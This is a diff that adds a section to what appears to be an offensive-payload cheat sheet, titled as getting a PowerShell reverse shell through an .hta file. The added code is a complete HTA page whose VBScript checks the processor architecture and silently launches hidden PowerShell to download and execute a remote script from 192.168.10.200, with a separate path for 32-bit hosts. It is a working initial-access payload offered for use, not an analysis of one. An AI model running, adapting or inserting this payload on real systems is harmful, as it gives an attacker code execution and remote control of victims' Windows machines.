@@ -66,3 +66,28 @@
   </script>
 </html>
 ```
+### .hta file execution (requres Internet Explorer) 04 - Get poweshell reverse shell after checking the desired architecture
+```
+<html>
+  <head>
+    <title>PS Shell</title>
+  </head>
+  <body>
+    <h2>get shell PS</h2>
+    <p>This is a HTA...</p>
+  </body>
+  
+  <script language="VBScript">
+    Function Pwn()
+  Set shell = CreateObject("wscript.Shell")
+  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
+    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
+  Else
+    shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
+  End If
+    End Function
+    Pwn
+  </script>
+</html>
+
+```
